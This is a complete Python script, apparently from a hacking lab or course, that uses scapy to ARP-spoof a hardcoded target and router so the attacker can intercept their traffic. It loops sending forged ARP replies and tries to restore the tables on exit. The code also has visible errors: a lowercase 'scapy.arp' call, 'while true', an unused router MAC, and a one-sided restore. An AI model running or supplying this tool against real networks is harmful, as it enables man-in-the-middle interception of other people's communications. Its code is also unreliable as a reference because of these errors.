#!/usr/bin/env python3
import scapy.all as scapy
import time

target_ip = "192.168.227.129"
router_mac = "00:0c:29:72:07:82"
router_ip = "192.168.227.2"


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.arp(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, verbose=False)


def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)


sent_packets = 0
try:
    while true:
        sent_packets += 2
        spoof(target_ip, router_ip)
        spoof(router_ip, target_ip)
        print(f"\r[+]packets sent: {sent_packets}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C ..... Resetting ARP Tables. Please Wait!!")
    restore(target_ip, router_ip)
